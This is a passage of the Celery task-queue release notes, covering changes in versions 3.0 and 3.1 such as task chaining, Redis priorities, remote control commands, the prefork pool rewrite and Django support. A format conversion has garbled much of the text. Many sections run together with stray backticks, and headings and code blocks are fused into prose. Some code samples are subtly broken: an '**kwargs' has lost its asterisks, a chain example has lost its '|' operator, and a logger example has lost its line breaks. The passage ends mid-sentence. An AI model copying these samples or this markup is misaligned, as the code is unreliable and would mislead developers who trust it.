>     > The timeout is set to one hour by default, but can be changed by configuring a transport option:
>     > 
>     >     BROKER_TRANSPORT_OPTIONS = {'visibility_timeout': 18000}  # 5 hours
> 
> \> **Note**

  - \>  
    Messages that haven't been acked will be redelivered if the visibility timeout is exceeded, for Celery users this means that ETA/countdown tasks that are scheduled to execute with a time that exceeds the visibility timeout will be executed twice (or more). If you plan on using long ETA/countdowns you should tweak the visibility timeout accordingly.
    
    Setting a long timeout means that it'll take a long time for messages to be redelivered in the event of a power failure, but if so happens you could temporarily set the visibility timeout lower to flush out messages when you start up the systems again.

## News

### Chaining Tasks

Tasks can now have callbacks and errbacks, and dependencies are recorded

  - The task message format have been updated with two new extension keys
    
    > Both keys can be empty/undefined or a list of subtasks.
    > 
    >   - `callbacks`
    >     
    >     > Applied if the task exits successfully, with the result of the task as an argument.
    > 
    >   - `errbacks`
    >     
    >     > Applied if an error occurred while executing the task, with the uuid of the task as an argument. Since it may not be possible to serialize the exception instance, it passes the uuid of the task instead. The uuid can then be used to retrieve the exception and traceback of the task from the result backend.
    > 
    >   - `link` and `link_error` keyword arguments has been added to `apply_async`.
    >     
    >     > These add callbacks and errbacks to the task, and you can read more about them at \[calling-links\](\#calling-links).
    > 
    >   - We now track what subtasks a task sends, and some result backends supports retrieving this information.
    >     
    >     >   - task.request.children
    >     >     
    >     >     > Contains the result instances of the subtasks the currently executing task has applied.
    >     > 
    >     >   - AsyncResult.children
    >     >     
    >     >     > Returns the tasks dependencies, as a list of `AsyncResult`/`ResultSet` instances.
    >     > 
    >     >   - AsyncResult.iterdeps
    >     >     
    >     >     > Recursively iterates over the tasks dependencies, yielding <span class="title-ref">(parent, node)</span> tuples.
    >     >     > 
    >     >     > Raises IncompleteStream if any of the dependencies hasn't returned yet.
    >     > 
    >     >   - AsyncResult.graph
    >     >     
    >     >     > A <span class="title-ref">\~celery.utils.graph.DependencyGraph</span> of the tasks dependencies. With this you can also convert to dot format:
    >     >     > 
    >     >     >   - \`\`\`python
    >     >     >     
    >     >     >       - with open('graph.dot') as fh:  
    >     >     >         result.graph.to\_dot(fh)
    >     >     > 
    >     >     > then produce an image of the graph:
    >     >     > 
    >     >     > ``` console
    >     >     > $ dot -Tpng graph.dot -o graph.png
    >     >     > ```

  - A new special subtask called `chain` is also included:
    
    > 
    > 
    > ``` pycon
    > >>> from celery import chain
    > 
    > # (2 + 2) * 8 / 2
    > >>> res = chain(add.subtask((2, 2)),
    >                 mul.subtask((8,)),
    >                 div.subtask((2,))).apply_async()
    > >>> res.get() == 16
    > 
    > >>> res.parent.get() == 32
    > 
    > >>> res.parent.parent.get() == 4
    > ```

  - Adds <span class="title-ref">AsyncResult.get\_leaf</span>
    
    > Waits and returns the result of the leaf subtask. That's the last node found when traversing the graph, but this means that the graph can be 1-dimensional only (in effect a list).

  - Adds `subtask.link(subtask)` + `subtask.link_error(subtask)`
    
    > Shortcut to `s.options.setdefault('link', []).append(subtask)`

  - Adds `subtask.flatten_links()`
    
    > Returns a flattened list of all dependencies (recursively)

Redis: Priority support `` ` -----------------------  The message's ``priority`field is now respected by the Redis transport by having multiple lists for each named queue. The queues are then consumed by in order of priority.  The priority field is a number in the range of 0 - 9, where 0 is the default and highest priority.  The priority range is collapsed into four steps by default, since it is unlikely that nine steps will yield more benefit than using four steps. The number of steps can be configured by setting the`priority\_steps`transport option, which must be a list of numbers in **sorted order**:`\`pycon \>\>\> BROKER\_TRANSPORT\_OPTIONS = { ... 'priority\_steps': \[0, 2, 4, 6, 8, 9\], ... }

Priorities implemented in this way isn't as reliable as `` ` priorities on the server side, which is why the feature is nicknamed "quasi-priorities"; **Using routing is still the suggested way of ensuring quality of service**, as client implemented priorities fall short in a number of ways, for example if the worker is busy with long running tasks, has prefetched many messages, or the queues are congested.  Still, it is possible that using priorities in combination with routing can be more beneficial than using routing or priorities alone. Experimentation and monitoring should be used to prove this.  Contributed by Germán M. Bravo.  Redis: Now cycles queues so that consuming is fair --------------------------------------------------  This ensures that a very busy queue won't block messages from other queues, and ensures that all queues have an equal chance of being consumed from.  This used to be the case before, but the behavior was accidentally changed while switching to using blocking pop.   `group`/`chord`/`chain` are now subtasks ----------------------------------------  - group is no longer an alias to ``TaskSet`, but new all together,   since it was very difficult to migrate the`TaskSet`class to become   a subtask.  - A new shortcut has been added to tasks:`\`pycon \>\>\> task.s(arg1, arg2, kw=1)

> as a shortcut to:
> 
> ``` pycon
> >>> task.subtask((arg1, arg2), {'kw': 1})
> ```

  - Tasks can be chained by using the `|` operator:
    
    > 
    > 
    > ``` pycon
    > >>> (add.s(2, 2), pow.s(2)).apply_async()
    > ```

  - Subtasks can be "evaluated" using the `~` operator:
    
    > 
    > 
    > ``` pycon
    > >>> ~add.s(2, 2)
    > 4
    > 
    > >>> ~(add.s(2, 2) | pow.s(2))
    > ```
    > 
    > is the same as:
    > 
    > ``` pycon
    > >>> chain(add.s(2, 2), pow.s(2)).apply_async().get()
    > ```

  - A new subtask\_type key has been added to the subtask dictionary.
    
    > This can be the string `"chord"`, `"group"`, `"chain"`, `"chunks"`, `"xmap"`, or `"xstarmap"`.

  - maybe\_subtask now uses subtask\_type to reconstruct the object, to be used when using non-pickle serializers.

  - The logic for these operations have been moved to dedicated tasks celery.chord, celery.chain and celery.group.

  - subtask no longer inherits from AttributeDict.
    
    > It's now a pure dict subclass with properties for attribute access to the relevant keys.

  - The repr's now outputs how the sequence would like imperatively:
    
    > 
    > 
    > ``` pycon
    > >>> from celery import chord
    > 
    > >>> (chord([add.s(i, i) for i in xrange(10)], xsum.s())
    >       | pow.s(2))
    > tasks.xsum([tasks.add(0, 0),
    >             tasks.add(1, 1),
    >             tasks.add(2, 2),
    >             tasks.add(3, 3),
    >             tasks.add(4, 4),
    >             tasks.add(5, 5),
    >             tasks.add(6, 6),
    >             tasks.add(7, 7),
    >             tasks.add(8, 8),
    >             tasks.add(9, 9)]) | tasks.pow(2)
    > ```

New remote control commands `` ` ---------------------------  These commands were previously experimental, but they've proven stable and is now documented as part of the official API.  - :control:`add_consumer`/:control:`cancel_consumer`      Tells workers to consume from a new queue, or cancel consuming from a     queue. This command has also been changed so that the worker remembers     the queues added, so that the change will persist even if     the connection is re-connected.      These commands are available programmatically as     `@control.add_consumer` / `@control.cancel_consumer`: ``\`pycon \>\>\> celery.control.add\_consumer(queue\_name, ... destination=\['w1.example.com'\]) \>\>\> celery.control.cancel\_consumer(queue\_name, ... destination=\['w1.example.com'\])

> or using the `celery control` command:
> 
> ``` console
> $ celery control -d w1.example.com add_consumer queue
> $ celery control -d w1.example.com cancel_consumer queue
> ```
> 
> \> **Note**

  - \>  
    Remember that a control command without *destination* will be sent to **all workers**.

<!-- end list -->

  - `autoscale`
    
    > Tells workers with `--autoscale` enabled to change autoscale max/min concurrency settings.
    > 
    > This command is available programmatically as \`@control.autoscale\`:
    > 
    > ``` pycon
    > >>> celery.control.autoscale(max=10, min=5,
    > ...     destination=['w1.example.com'])
    > ```
    > 
    > or using the `celery control` command:
    > 
    > ``` console
    > $ celery control -d w1.example.com autoscale 10 5
    > ```

  - `pool_grow`/`pool_shrink`
    
    > Tells workers to add or remove pool processes.
    > 
    > These commands are available programmatically as <span class="title-ref">@control.pool\_grow</span> / \`@control.pool\_shrink\`:
    > 
    > ``` pycon
    > >>> celery.control.pool_grow(2, destination=['w1.example.com'])
    > >>> celery.control.pool_shrink(2, destination=['w1.example.com'])
    > ```
    > 
    > or using the `celery control` command:
    > 
    > ``` console
    > $ celery control -d w1.example.com pool_grow 2
    > $ celery control -d w1.example.com pool_shrink 2
    > ```

  - `celery control` now supports `rate_limit` and `time_limit` commands.
    
    > See `celery control --help` for details.

Crontab now supports Day of Month, and Month of Year arguments `` ` --------------------------------------------------------------  See the updated list of examples at [beat-crontab](#beat-crontab).  Immutable subtasks ------------------ ``subtask`'s can now be immutable, which means that the arguments won't be modified when calling callbacks:`\`pycon \>\>\> chain(add.s(2, 2), clear\_static\_electricity.si())

means it'll not receive the argument of the parent task, `` ` and ``.si()`is a shortcut to:`\`pycon \>\>\> clear\_static\_electricity.subtask(immutable=True)

Logging Improvements `` ` --------------------  Logging support now conforms better with best practices.  - Classes used by the worker no longer uses app.get_default_logger, but uses   `celery.utils.log.get_logger` which simply gets the logger not setting the   level, and adds a NullHandler.  - Loggers are no longer passed around, instead every module using logging   defines a module global logger that's used throughout.  - All loggers inherit from a common logger called "celery".  - Before ``task.get\_logger``would setup a new logger for every task,   and even set the log level. This is no longer the case.      - Instead all task loggers now inherit from a common "celery.task" logger       that's set up when programs call `setup_logging_subsystem`.      - Instead of using LoggerAdapter to augment the formatter with       the task_id and task_name field, the task base logger now use       a special formatter adding these values at run-time from the       currently executing task.  - In fact,``task.get\_logger`is no longer recommended, it is better   to add a module-level logger to your tasks module.      For example, like this:`\`python from celery.utils.log import get\_task\_logger

> logger = get\_task\_logger(\_\_name\_\_)
> 
> @celery.task def add(x, y): logger.debug('Adding %r + %r' % (x, y)) return x + y
> 
> The resulting logger will then inherit from the `"celery.task"` logger so that the current task name and id is included in logging output.

  - Redirected output from stdout/stderr is now logged to a "celery.redirected" logger.
  - In addition a few warnings.warn have been replaced with logger.warn.
  - Now avoids the 'no handlers for logger multiprocessing' warning

Task registry no longer global `` ` ------------------------------  Every Celery instance now has its own task registry.  You can make apps share registries by specifying it: ``\`pycon \>\>\> app1 = Celery() \>\>\> app2 = Celery(tasks=app1.tasks)

Note that tasks are shared between registries by default, so that `` ` tasks will be added to every subsequently created task registry. As an alternative tasks can be private to specific task registries by setting the ``shared`argument to the`@task`decorator:`\`python @celery.task(shared=False) def add(x, y): return x + y

Abstract tasks are now lazily bound `` ` -----------------------------------  The `~celery.task.Task` class is no longer bound to an app by default, it will first be bound (and configured) when a concrete subclass is created.  This means that you can safely import and make task base classes, without also initializing the app environment: ``\`python from celery.task import Task

>   - class DebugTask(Task):  
>     abstract = True
>     
>     def \_\_call\_\_(self, *args,kwargs): print('CALLING %r' % (self,)) return self.run(*args, \*\*kwargs)

``` pycon
>>> DebugTask
<unbound DebugTask>

>>> @celery1.task(base=DebugTask)
... def add(x, y):
...     return x + y
>>> add.__class__
<class add of <Celery default:0x101510d10>>
```

Lazy task decorators `` ` --------------------  The ``@task`decorator is now lazy when used with custom apps.  That is, if`accept\_magic\_kwargs``is enabled (her by called "compat mode"), the task decorator executes inline like before, however for custom apps the @task decorator now returns a special PromiseProxy object that's only evaluated on access.  All promises will be evaluated when `@finalize` is called, or implicitly when the task registry is first used.   Smart `--app` option --------------------  The :option:`--app <celery --app>` option now 'auto-detects'      - If the provided path is a module it tries to get an       attribute named 'celery'.      - If the provided path is a package it tries       to import a sub module named celery',       and get the celery attribute from that module.  For example, if you have a project named``proj`where the celery app is located in`from proj.celery import app`, then the following will be equivalent:`\`console $ celery worker --app=proj $ celery worker --app=proj.celery: $ celery worker --app=proj.celery:app

In Other News `` ` -------------  - New :setting:`CELERYD_WORKER_LOST_WAIT` to control the timeout in   seconds before `billiard.WorkerLostError` is raised   when a worker can't be signaled (Issue #595).      Contributed by Brendon Crawford.  - Redis event monitor queues are now automatically deleted (Issue #436).  - App instance factory methods have been converted to be cached   descriptors that creates a new subclass on access.      For example, this means that ``app.Worker`is an actual class     and will work as expected when:`\`python class Worker(app.Worker): ...

  - New signal: `task_success`.

  - Multiprocessing logs are now only emitted if the `MP_LOG` environment variable is set.

  - The Celery instance can now be created with a broker URL
    
    > 
    > 
    > ``` python
    > app = Celery(broker='redis://')
    > ```

  - Result backends can now be set using a URL
    
    > Currently only supported by redis. Example use:
    > 
    > ``` python
    > CELERY_RESULT_BACKEND = 'redis://localhost/1'
    > ```

  - Heartbeat frequency now every 5s, and frequency sent with event
    
    > The heartbeat frequency is now available in the worker event messages, so that clients can decide when to consider workers offline based on this value.

  - Module celery.actors has been removed, and will be part of cl instead.

  - Introduces new `celery` command, which is an entry-point for all other commands.
    
    > The main for this command can be run by calling `celery.start()`.

  - Annotations now supports decorators if the key starts with '@'.
    
    > For example:
    > 
    > ``` python
    > def debug_args(fun):
    > 
    >     @wraps(fun)
    >     def _inner(*args, **kwargs):
    >         print('ARGS: %r' % (args,))
    >     return _inner
    > 
    > CELERY_ANNOTATIONS = {
    >     'tasks.add': {'@__call__': debug_args},
    > }
    > ```
    > 
    > Also tasks are now always bound by class so that annotated methods end up being bound.

  - Bug-report now available as a command and broadcast command
    
    >   - Get it from a Python REPL:
    >     
    >     > 
    >     > 
    >     > ``` pycon
    >     > >>> import celery
    >     > >>> print(celery.bugreport())
    >     > ```
    > 
    >   - Using the `celery` command line program:
    >     
    >     > 
    >     > 
    >     > ``` console
    >     > $ celery report
    >     > ```
    > 
    >   - Get it from remote workers:
    >     
    >     > 
    >     > 
    >     > ``` console
    >     > $ celery inspect report
    >     > ```

  - Module `celery.log` moved to `celery.app.log`.

  - Module `celery.task.control` moved to `celery.app.control`.

  - New signal: `task_revoked`
    
    > Sent in the main process when the task is revoked or terminated.

  - `AsyncResult.task_id` renamed to `AsyncResult.id`

  - `TasksetResult.taskset_id` renamed to `.id`

  - `xmap(task, sequence)` and `xstarmap(task, sequence)`
    
    > Returns a list of the results applying the task function to every item in the sequence.
    > 
    > Example:
    > 
    > ``` pycon
    > >>> from celery import xstarmap
    > 
    > >>> xstarmap(add, zip(range(10), range(10)).apply_async()
    > [0, 2, 4, 6, 8, 10, 12, 14, 16, 18]
    > ```

  - `chunks(task, sequence, chunksize)`

  - `group.skew(start=, stop=, step=)`
    
    > Skew will skew the countdown for the individual tasks in a group -- for example with this group:
    > 
    > ``` pycon
    > >>> g = group(add.s(i, i) for i in xrange(10))
    > ```
    
    Skewing the tasks from 0 seconds to 10 seconds:
    
    > 
    > 
    > ``` pycon
    > >>> g.skew(stop=10)
    > ```
    
    Will have the first task execute in 0 seconds, the second in 1 second, the third in 2 seconds and so on.

  - 99% test Coverage

  - `CELERY_QUEUES` can now be a list/tuple of <span class="title-ref">\~kombu.Queue</span> instances.
    
    > Internally <span class="title-ref">@amqp.queues</span> is now a mapping of name/Queue instances, instead of converting on the fly.

  - Can now specify connection for <span class="title-ref">@control.inspect</span>.
    
    > 
    > 
    > ``` python
    > from kombu import Connection
    > 
    > i = celery.control.inspect(connection=Connection('redis://'))
    > i.active_queues()
    > ```

  - `CELERY_FORCE_EXECV` is now enabled by default.
    
    > If the old behavior is wanted the setting can be set to False, or the new <span class="title-ref">--no-execv</span> option to `celery worker`.

  - Deprecated module `celery.conf` has been removed.

  - The `CELERY_TIMEZONE` now always require the `pytz` library to be installed (except if the timezone is set to <span class="title-ref">UTC</span>).

  - The Tokyo Tyrant backend has been removed and is no longer supported.

  - Now uses <span class="title-ref">\~kombu.common.maybe\_declare</span> to cache queue declarations.

  - There's no longer a global default for the `CELERYBEAT_MAX_LOOP_INTERVAL` setting, it is instead set by individual schedulers.

  - Worker: now truncates very long message bodies in error reports.

  - No longer deep-copies exceptions when trying to serialize errors.

  - `CELERY_BENCH` environment variable, will now also list memory usage statistics at worker shutdown.

  - Worker: now only ever use a single timer for all timing needs, and instead set different priorities.

  - An exceptions arguments are now safely pickled
    
    > Contributed by Matt Long.

  - Worker/Beat no longer logs the start-up banner.
    
    > Previously it would be logged with severity warning, now it's only written to stdout.

  - The `contrib/` directory in the distribution has been renamed to `extra/`.

  - New signal: `task_revoked`

  - `celery.contrib.migrate`: Many improvements, including; filtering, queue migration, and support for acking messages on the broker migrating from.
    
    > Contributed by John Watson.

  - Worker: Prefetch count increments are now optimized and grouped together.

  - Worker: No longer calls `consume` on the remote control command queue twice.
    
    > Probably didn't cause any problems, but was unnecessary.

Internals `` ` ---------  - ``app.broker\_connection`is now`app.connection`Both names still work.  - Compatibility modules are now generated dynamically upon use.      These modules are`celery.messaging`,`celery.log`,`celery.decorators`and`celery.registry``.  - :mod:`celery.utils` refactored into multiple modules:      :mod:`celery.utils.text`     :mod:`celery.utils.imports`     :mod:`celery.utils.functional`  - Now using :mod:`kombu.utils.encoding` instead of   :mod:`celery.utils.encoding`.  - Renamed module``celery.routes``-> :mod:`celery.app.routes`.  - Renamed package``celery.db``-> :mod:`celery.backends.database`.  - Renamed module``celery.abstract``-> :mod:`celery.worker.bootsteps`.  - Command line docs are now parsed from the module docstrings.  - Test suite directory has been reorganized.  - :program:`setup.py` now reads docs from the :file:`requirements/` directory.  - Celery commands no longer wraps output (Issue #700).      Contributed by Thomas Johansson.  .. _v300-experimental:  Experimental ============  :mod:`celery.contrib.methods`:  Task decorator for methods ----------------------------------------------------------  This is an experimental module containing a task decorator, and a task decorator filter, that can be used to create tasks out of methods::      from celery.contrib.methods import task_method      class Counter(object):          def __init__(self):             self.value = 1          @celery.task(name='Counter.increment', filter=task_method)         def increment(self, n=1):             self.value += 1             return self.value   See :mod:`celery.contrib.methods` for more information.  .. _v300-unscheduled-removals:  Unscheduled Removals ====================  Usually we don't make backward incompatible removals, but these removals should have no major effect.  - The following settings have been renamed:      -``CELERYD\_ETA\_SCHEDULER`->`CELERYD\_TIMER`-`CELERYD\_ETA\_SCHEDULER\_PRECISION`->`CELERYD\_TIMER\_PRECISION`.. _v300-deprecations:  Deprecation Time-line Changes =============================  See the [deprecation-timeline](#deprecation-timeline).  - The`celery.backends.pyredis``compat module has been removed.      Use :mod:`celery.backends.redis` instead!  - The following undocumented API's has been moved:      -``control.inspect.add\_consumer``-> `@control.add_consumer`.     -``control.inspect.cancel\_consumer``-> `@control.cancel_consumer`.     -``control.inspect.enable\_events``-> `@control.enable_events`.     -``control.inspect.disable\_events``-> `@control.disable_events`.      This way``inspect()`is only used for commands that don't     modify anything, while idempotent control commands that make changes     are on the control objects.  Fixes =====  - Retry SQLAlchemy backend operations on DatabaseError/OperationalError   (Issue #634)  - Tasks that called`retry\`\` wasn't acknowledged if acks late was enabled

> Fix contributed by David Markey.

  - The message priority argument wasn't properly propagated to Kombu (Issue \#708).
    
    > Fix contributed by Eran Rundstein

---

whatsnew-3.1.md

---

# What's new in Celery 3.1 (Cipater)

  - Author  
    Ask Solem (`ask at celeryproject.org`)

<div class="sidebar">

**Change history**

What's new documents describe the changes in major versions, we also have a \[changelog\](\#changelog) that lists the changes in bugfix releases (0.0.x), while older series are archived under the \[history\](\#history) section.

</div>

Celery is a simple, flexible, and reliable distributed system to process vast amounts of messages, while providing operations with the tools required to maintain such a system.

It's a task queue with focus on real-time processing, while also supporting task scheduling.

Celery has a large and diverse community of users and contributors, you should come join us \[on IRC \<irc-channel\>\](\#on-irc-\<irc-channel\>) or \[our mailing-list \<mailing-list\>\](\#our-mailing-list-\<mailing-list\>).

To read more about Celery you should go read the \[introduction \<intro\>\](\#introduction-\<intro\>).

While this version is backward compatible with previous versions it's important that you read the following section.

This version is officially supported on CPython 2.6, 2.7, and 3.3, and also supported on PyPy.

<div class="topic">

**Table of Contents**

Make sure you read the important notes before upgrading to this version.

</div>

<div class="contents" data-local="" data-depth="2">

</div>

## Preface

Deadlocks have long plagued our workers, and while uncommon they're not acceptable. They're also infamous for being extremely hard to diagnose and reproduce, so to make this job easier I wrote a stress test suite that bombards the worker with different tasks in an attempt to break it.

What happens if thousands of worker child processes are killed every second? what if we also kill the broker connection every 10 seconds? These are examples of what the stress test suite will do to the worker, and it reruns these tests using different configuration combinations to find edge case bugs.

The end result was that I had to rewrite the prefork pool to avoid the use of the POSIX semaphore. This was extremely challenging, but after months of hard work the worker now finally passes the stress test suite.

There's probably more bugs to find, but the good news is that we now have a tool to reproduce them, so should you be so unlucky to experience a bug then we'll write a test for it and squash it\!

Note that I've also moved many broker transports into experimental status: the only transports recommended for production use today is RabbitMQ and Redis.

I don't have the resources to maintain all of them, so bugs are left unresolved. I wish that someone will step up and take responsibility for these transports or donate resources to improve them, but as the situation is now I don't think the quality is up to date with the rest of the code-base so I cannot recommend them for production use.

The next version of Celery 4.0 will focus on performance and removing rarely used parts of the library. Work has also started on a new message protocol, supporting multiple languages and more. The initial draft can be found \[here \<message-protocol-task-v2\>\](\#here-\<message-protocol-task-v2\>).

This has probably been the hardest release I've worked on, so no introduction to this changelog would be complete without a massive thank you to everyone who contributed and helped me test it\!

Thank you for your support\!

*— Ask Solem*

## Important Notes

### Dropped support for Python 2.5

Celery now requires Python 2.6 or later.

The new dual code base runs on both Python 2 and 3, without requiring the `2to3` porting tool.

\> **Note** \> This is also the last version to support Python 2.6\! From Celery 4.0 and on-wards Python 2.7 or later will be required.

### Last version to enable Pickle by default

Starting from Celery 4.0 the default serializer will be json.

If you depend on pickle being accepted you should be prepared for this change by explicitly allowing your worker to consume pickled messages using the `CELERY_ACCEPT_CONTENT` setting:

`` `python     CELERY_ACCEPT_CONTENT = ['pickle', 'json', 'msgpack', 'yaml']  Make sure you only select the serialization formats you'll actually be using, ``\` and make sure you've properly secured your broker from unwanted access (see the \[Security Guide \<guide-security\>\](\#security-guide-\<guide-security\>)).

The worker will emit a deprecation warning if you don't define this setting.

<div class="topic">

**for Kombu users**

Kombu 3.0 no longer accepts pickled messages by default, so if you use Kombu directly then you have to configure your consumers: see the \[Kombu 3.0 Changelog \<kombu:version-3.0.0\>\](\#kombu-3.0-changelog-\<kombu:version-3.0.0\>) for more information.

</div>

### Old command-line programs removed and deprecated

Everyone should move to the new `celery` umbrella command, so we're incrementally deprecating the old command names.

In this version we've removed all commands that aren't used in init-scripts. The rest will be removed in 4.0.

| Program         | New Status   | Replacement               |
| --------------- | ------------ | ------------------------- |
| `celeryd`       | *DEPRECATED* | `celery worker`           |
| `celerybeat`    | *DEPRECATED* | `celery beat`             |
| `celeryd-multi` | *DEPRECATED* | `celery multi`            |
| `celeryctl`     | **REMOVED**  | `celery inspect\|control` |
| `celeryev`      | **REMOVED**  | `celery events`           |
| `camqadm`       | **REMOVED**  | `celery amqp`             |

If this isn't a new installation then you may want to remove the old commands:

`` `console     $ pip uninstall celery     $ # repeat until it fails     # ...     $ pip uninstall celery     $ pip install celery  Please run :program:`celery --help` for help using the umbrella command.  .. _v310-news:  News ``\` ====

### Prefork Pool Improvements

These improvements are only active if you use an async capable transport. This means only RabbitMQ (AMQP) and Redis are supported at this point and other transports will still use the thread-based fallback implementation.

  - Pool is now using one IPC queue per child process.
    
    > Previously the pool shared one queue between all child processes, using a POSIX semaphore as a mutex to achieve exclusive read and write access.
    > 
    > The POSIX semaphore has now been removed and each child process gets a dedicated queue. This means that the worker will require more file descriptors (two descriptors per process), but it also means that performance is improved and we can send work to individual child processes.
    > 
    > POSIX semaphores aren't released when a process is killed, so killing processes could lead to a deadlock if it happened while the semaphore was acquired. There's no good solution to fix this, so the best option was to remove the semaphore.

  - Asynchronous write operations
    
    > The pool now uses async I/O to send work to the child processes.

  - Lost process detection is now immediate.
    
    > If a child process is killed or exits mysteriously the pool previously had to wait for 30 seconds before marking the task with a <span class="title-ref">\~celery.exceptions.WorkerLostError</span>. It had to do this because the out-queue was shared between all processes, and the pool couldn't be certain whether the process completed the task or not. So an arbitrary timeout of 30 seconds was chosen, as it was believed that the out-queue would've been drained by this point.
    > 
    > This timeout is no longer necessary, and so the task can be marked as failed as soon as the pool gets the notification that the process exited.

  - Rare race conditions fixed
    
    > Most of these bugs were never reported to us, but were discovered while running the new stress test suite.

#### Caveats

<div class="topic">

**Long running tasks**

The new pool will send tasks to a child process as long as the process in-queue is writable, and since the socket is buffered this means that the processes are, in effect, prefetching tasks.

This benefits performance but it also means that other tasks may be stuck waiting for a long running task to complete:

    -> send T1 to Process A
    # A executes T1
    -> send T2 to Process B
    # B executes T2
    <- T2 complete
    
    -> send T3 to Process A
    # A still executing T1, T3 stuck in local buffer and
    # won't start until T1 returns

The buffer size varies based on the operating system: some may have a buffer as small as 64KB but on recent Linux versions the buffer size is 1MB (can only be changed system wide).

You can disable this prefetching behavior by enabling the `-Ofair <celery worker -O>` worker option:

  - \`\`\`console  
    $ celery -A proj worker -l info -Ofair

With this option enabled the worker will only write to workers that are available for work, disabling the prefetch behavior.

</div>

<div class="topic">

**Max tasks per child**

If a process exits and pool prefetch is enabled the worker may have already written many tasks to the process in-queue, and these tasks must then be moved back and rewritten to a new process.

This is very expensive if you have the `--max-tasks-per-child <celery worker --max-tasks-per-child>` option set to a low value (e.g., less than 10), you should not be using the `-Ofast <celery worker -O>` scheduler option.

</div>

Django supported out of the box `` ` -------------------------------  Celery 3.0 introduced a shiny new API, but unfortunately didn't have a solution for Django users.  The situation changes with this version as Django is now supported in core and new Django users coming to Celery are now expected to use the new API directly.  The Django community has a convention where there's a separate ``django-x`package for every library, acting like a bridge between Django and the library.  Having a separate project for Django users has been a pain for Celery, with multiple issue trackers and multiple documentation sources, and then lastly since 3.0 we even had different APIs.  With this version we challenge that convention and Django users will use the same library, the same API and the same documentation as everyone else.  There's no rush to port your existing code to use the new API, but if you'd like to experiment with it you should know that:  - You need to use a Celery application instance.      The new Celery API introduced in 3.0 requires users to instantiate the     library by creating an application:`\`python from celery import Celery

> app = Celery()

  - You need to explicitly integrate Celery with Django
    
    > Celery won't automatically use the Django settings, so you can either configure Celery separately or you can tell it to use the Django settings with:
    > 
    > ``` python
    > app.config_from_object('django.conf:settings')
    > ```
    > 
    > Neither will it automatically traverse your installed apps to find task modules. If you want this behavior, you must explicitly pass a list of Django instances to the Celery app:
    > 
    > ``` python
    > from django.conf import settings
    > app.autodiscover_tasks(lambda: settings.INSTALLED_APPS)
    > ```

\- You no longer use `manage.py`

> Instead you use the `celery` command directly:
> 
> ``` console
> $ celery -A proj worker -l info
> ```
> 
> For this to work your app module must store the `DJANGO_SETTINGS_MODULE` environment variable, see the example in the \[Django guide \<django-first-steps\>\](\#django

\----guide-\<django-first-steps\>).

To get started with the new API you should first read the \[first-steps\](\#first-steps) `` ` tutorial, and then you should read the Django-specific instructions in [django-first-steps](#django-first-steps).  The fixes and improvements applied by the :pypi:`django-celery` library are now automatically applied by core Celery when it detects that the :envvar:`DJANGO_SETTINGS_MODULE` environment variable is set.  The distribution ships with a new example project using Django in :file:`examples/django`:  https://github.com/celery/celery/tree/3.1/examples/django  Some features still require the :pypi:`django-celery` library:      - Celery doesn't implement the Django database or cache result backends.     - Celery doesn't ship with the database-based periodic task         scheduler.  > **Note** >      If you're still using the old API when you upgrade to Celery 3.1     then you must make sure that your settings module contains     the ``djcelery.setup\_loader()``line, since this will     no longer happen as a side-effect of importing the :pypi:`django-celery`     module.      New users (or if you've ported to the new API) don't need the``setup\_loader`line anymore, and must make sure to remove it.  Events are now ordered using logical time -----------------------------------------  Keeping physical clocks in perfect sync is impossible, so using time-stamps to order events in a distributed system isn't reliable.  Celery event messages have included a logical clock value for some time, but starting with this version that field is also used to order them.  Also, events now record timezone information by including a new`utcoffset``field in the event message. This is a signed integer telling the difference from UTC time in hours, so for example, an event sent from the Europe/London timezone in daylight savings time will have an offset of 1.  `@events.Receiver` will automatically convert the time-stamps to the local timezone.  > **Note** >      The logical clock is synchronized with other nodes     in the same cluster (neighbors), so this means that the logical     epoch will start at the point when the first worker in the cluster     starts.      If all of the workers are shutdown the clock value will be lost     and reset to 0. To protect against this, you should specify the     :option:`celery worker --statedb` option such that the worker can     persist the clock value at shutdown.      You may notice that the logical clock is an integer value and     increases very rapidly. Don't worry about the value overflowing     though, as even in the most busy clusters it may take several     millennium before the clock exceeds a 64 bits value.  New worker node name format (``<name@host>`) -------------------------------------------  Node names are now constructed by two elements: name and host-name separated by '@'.  This change was made to more easily identify multiple instances running on the same machine.  If a custom name isn't specified then the worker will use the name 'celery' by default, resulting in a fully qualified node name of 'celery@hostname':`\`console $ celery worker -n example.com <celery@example.com>

To also set the name you must include the @:

``` console
$ celery worker -n worker1@example.com
worker1@example.com
```

The worker will identify itself using the fully qualified `` ` node name in events and broadcast messages, so where before a worker would identify itself as 'worker1.example.com', it'll now use 'celery@worker1.example.com'.  Remember that the :option:`-n <celery worker -n>` argument also supports simple variable substitutions, so if the current host-name is *george.example.com* then the ``%h`macro will expand into that:`\`console $ celery worker -n <worker1@%h> <worker1@george.example.com>

The available substitutions are as follows:

\+---------------+----------------------------------------+ `` ` | Variable      | Substitution                           | +===============+========================================+ | ``%h`| Full host-name (including domain name) | +---------------+----------------------------------------+ |`%d`| Domain name only                       | +---------------+----------------------------------------+ |`%n`| Host-name only (without domain name)   | +---------------+----------------------------------------+ |`%%`| The character`%`| +---------------+----------------------------------------+  Bound tasks -----------  The task decorator can now create "bound tasks", which means that the task will receive the`self`argument.`\`python @app.task(bind=True) def send\_twitter\_status(self, oauth, tweet): try: twitter = Twitter(oauth) twitter.update\_status(tweet) except (Twitter.FailWhaleError, Twitter.LoginError) as exc: raise self.retry(exc=exc)

Using *bound tasks* is now the recommended approach whenever `` ` you need access to the task instance or request context. Previously one would've to refer to the name of the task instead ( ``send\_twitter\_status.retry``), but this could lead to problems in some configurations.  Mingle: Worker synchronization ------------------------------  The worker will now attempt to synchronize with other workers in the same cluster.  Synchronized data currently includes revoked tasks and logical clock.  This only happens at start-up and causes a one second start-up delay to collect broadcast responses from other workers.  You can disable this bootstep using the :option:`celery worker --without-mingle` option.  Gossip: Worker <-> Worker communication ---------------------------------------  Workers are now passively subscribing to worker related events like heartbeats.  This means that a worker knows what other workers are doing and can detect if they go offline. Currently this is only used for clock synchronization, but there are many possibilities for future additions and you can write extensions that take advantage of this already.  Some ideas include consensus protocols, reroute task to best worker (based on resource usage or data locality) or restarting workers when they crash.  We believe that although this is a small addition, it opens amazing possibilities.  You can disable this bootstep using the :option:`celery worker --without-gossip` option.  Bootsteps: Extending the worker -------------------------------  By writing bootsteps you can now easily extend the consumer part of the worker to add additional features, like custom message consumers.  The worker has been using bootsteps for some time, but these were never documented. In this version the consumer part of the worker has also been rewritten to use bootsteps and the new [guide-extending](#guide-extending) guide documents examples extending the worker, including adding custom message consumers.  See the 